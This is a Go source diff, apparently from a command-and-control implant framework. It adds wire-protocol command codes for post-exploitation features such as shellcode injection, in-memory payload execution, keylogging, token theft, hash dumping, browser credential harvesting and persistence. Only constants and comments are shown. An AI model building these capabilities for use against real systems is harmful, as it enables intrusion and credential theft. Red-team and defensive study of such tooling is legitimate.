@@ -63,6 +63,31 @@ const (
 	CmdHostShutdown uint32 = 29 // shut down the target computer
 	CmdHostLogoff   uint32 = 30 // log off the current user
 	CmdHostLock     uint32 = 31 // lock the workstation (Windows)
+
+	// Loader / post-exploitation commands (32+). All args are JSON; the agent
+	// resolves the handler through its command registry so new capabilities can
+	// be added without re-numbering the wire format.
+	CmdExecShellcode   uint32 = 32 // run shellcode in the current process
+	CmdInjectShellcode uint32 = 33 // inject shellcode into a remote process
+	CmdSpawn           uint32 = 34 // fork-and-run: suspended child + inject + run
+	CmdBOF             uint32 = 35 // execute a Beacon Object File (.o) in memory
+	CmdExecuteAssembly uint32 = 36 // run a .NET assembly in-process
+	CmdExecutePE       uint32 = 37 // run an EXE entirely from memory
+	CmdJobList         uint32 = 38 // list async jobs
+	CmdJobKill         uint32 = 39 // kill an async job
+	CmdPortscan        uint32 = 40 // async network scan
+	CmdSocks           uint32 = 41 // SOCKS5 proxy server (job)
+	CmdPortfwd         uint32 = 42 // local/reverse port forward (job)
+	CmdKeylog          uint32 = 43 // keyboard capture (job)
+	CmdClipboard       uint32 = 44 // clipboard snapshot / monitor
+	CmdTokenSteal      uint32 = 45 // duplicate a remote process token
+	CmdTokenRevert     uint32 = 46 // revert to the process token
+	CmdHashdump        uint32 = 47 // dump SAM/LSA hashes
+	CmdBrowserCreds    uint32 = 48 // harvest saved browser credentials
+	CmdPersist         uint32 = 49 // install persistence
+	CmdNetEnum         uint32 = 50 // network enumeration helpers
+	CmdGetSystem       uint32 = 51 // obtain SYSTEM via token manipulation
+	CmdDiagSSN         uint32 = 52 // diagnostic: warm + report the SSN table only
 )
 
 // RCP (Remote Control Protocol) message types. These ride on a separate,
@@ -119,6 +144,9 @@ const (
 	TaskCompleted   = "completed"
 	TaskFailed      = "failed"
 	TaskDownloading = "downloading"
+	// TaskJobOutput marks a streaming output line from an async job. It is
+	// relayed to the console without completing the owning task.
+	TaskJobOutput = "job_output"
 )
 
 // HeaderSize is Magic(4) + Size(4) + Type(1)
